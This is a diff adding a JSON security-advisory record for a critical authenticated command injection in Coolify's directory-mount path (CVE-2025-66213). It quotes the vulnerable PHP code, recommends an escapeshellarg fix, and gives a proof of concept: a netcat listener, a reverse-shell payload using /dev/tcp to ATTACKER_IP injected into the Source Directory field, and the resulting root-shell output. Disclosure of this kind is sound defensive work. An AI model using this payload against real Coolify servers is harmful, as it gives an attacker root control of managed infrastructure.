@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-cj2c-9jx8-j427",
+  "repo": {
+    "cve_id": "CVE-2025-66213",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nAn authenticated command injection vulnerability in the File Storage Directory Mount functionality allows users with application/service management permissions to execute arbitrary commands as root on managed servers. The `file_storage_directory_source` parameter is passed directly to shell commands without sanitization, enabling full remote code execution on the host system.\r\n\r\n### Details\r\n\r\n**Vulnerable File:** `app/Models/LocalFileVolume.php`\r\n\r\n**Vulnerable Code (multiple locations):**\r\n\r\nLine 64-66 (`loadStorageOnServer` function):\r\n```php\r\n$path = data_get_str($this, 'fs_path');\r\n// ...\r\n$isFile = instant_remote_process([\"test -f $path && echo OK || echo NOK\"], $server);\r\n$content = instant_remote_process([\"cat $path\"], $server, false);\r\n```\r\n\r\nLines 94-95 (`deleteStorageOnServer` function):\r\n```php\r\n$isFile = instant_remote_process([\"test -f $path && echo OK || echo NOK\"], $server);\r\n$isDir = instant_remote_process([\"test -d $path && echo OK || echo NOK\"], $server);\r\n```\r\n\r\nLines 138-141 (`saveStorageOnServer` function):\r\n```php\r\n$isFile = instant_remote_process([\"test -f $path && echo OK || echo NOK\"], $server);\r\n$isDir = instant_remote_process([\"test -d $path && echo OK || echo NOK\"], $server);\r\n// ...\r\n$commands->push(\"echo '$content' | base64 -d | tee $path > /dev/null\");\r\n```\r\n\r\nThe `fs_path` parameter originates from user input via `app/Livewire/Project/Service/Storage.php` lines 175-185:\r\n```php\r\npublic function submitFileStorageDirectory()\r\n{\r\n    $this->file_storage_directory_source = trim($this->file_storage_directory_source);\r\n    $this->file_storage_directory_source = str($this->file_storage_directory_source)->start('/')->value();\r\n    // ...\r\n    \\App\\Models\\LocalFileVolume::create([\r\n        'fs_path' => $this->file_storage_directory_source,  // No sanitization!\r\n        // ...\r\n    ]);\r\n}\r\n```\r\n\r\nThe only validation is `'file_storage_directory_source' => 'required|string'` (line 166), with no shell metacharacter filtering or use of `escapeshellarg()`. When the path is used in shell commands via `instant_remote_process()`, attackers can inject arbitrary commands using command substitution (`$(...)`).\r\n\r\nDue to Coolify's sudo injection mechanism in `bootstrap/helpers/sudo.php`, all injected commands execute with root privileges regardless of SSH user configuration.\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n- Coolify v4.0.0-beta.450 or earlier\r\n- Authenticated user with application/service management permissions\r\n- A deployed application or service\r\n\r\n**Steps to reproduce:**\r\n\r\n1. Start a netcat listener on attacker machine:\r\n```bash\r\nnc -lvnp 8888\r\n```\r\n\r\n2. Log into Coolify and navigate to any deployed application\r\n\r\n3. Go to **Configuration → Persistent Storage** tab\r\n\r\n4. Click **\"+ Add\"** and select **\"Directory Mount\"**\r\n\r\n5. Enter the following:\r\n   - **Source Directory:** `/tmp$(bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1)`\r\n   - **Destination Directory:** `/app/data`\r\n\r\n6. Click **\"Add\"**\r\n\r\n7. A root shell is received on the attacker's listener:\r\n```\r\nconnect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 43398\r\nbash: cannot set terminal process group: Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nroot@hostname:~#\r\n```\r\n\r\n### Impact\r\n\r\n**Severity:** Critical (CVSS 9.9)\r\n\r\n**Impact:**\r\n- **Remote Code Execution:** Attackers can execute arbitrary commands on managed servers\r\n- **Root Privilege:** All commands execute as root due to Coolify's sudo injection mechanism\r\n- **Full Server Compromise:** Attackers gain complete control of managed infrastructure\r\n- **Container Escape:** Access to Docker socket enables control of all containers\r\n- **Lateral Movement:** Compromised servers can be used to attack other managed resources\r\n- **Data Breach:** Access to all applications, databases, and secrets managed by Coolify\r\n\r\n**Who is affected:**\r\n- All Coolify self-hosted instances running v4.0.0-beta.450 or earlier\r\n- Any organization using Coolify to manage application deployments\r\n- All servers connected to a compromised Coolify instance\r\n\r\n**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command - OS Command Injection)\r\n\r\n**Recommended Fix:**\r\nApply `escapeshellarg()` to the `$path` variable before use in shell commands:\r\n```php\r\n$escapedPath = escapeshellarg($path);\r\n$isFile = instant_remote_process([\"test -f $escapedPath && echo OK || echo NOK\"], $server);\r\n```\r\n\r\nAdditionally, implement input validation to restrict directory paths to alphanumeric characters, dots, dashes, underscores, and forward slashes only, rejecting any shell metacharacters like `$`, `(`, `)`, `;`, `|`, `&`, etc.",
+    "ghsa_id": "GHSA-cj2c-9jx8-j427",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-cj2c-9jx8-j427",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cj2c-9jx8-j427"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-66213"
+      }
+    ],
+    "published_at": "2026-01-03T15:13:11Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in File Storage Directory Mount Path",
+    "updated_at": "2026-01-03T15:13:11Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": ">= 4.0.0-beta.451",
+        "vulnerable_version_range": "<= 4.0.0-beta.450"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
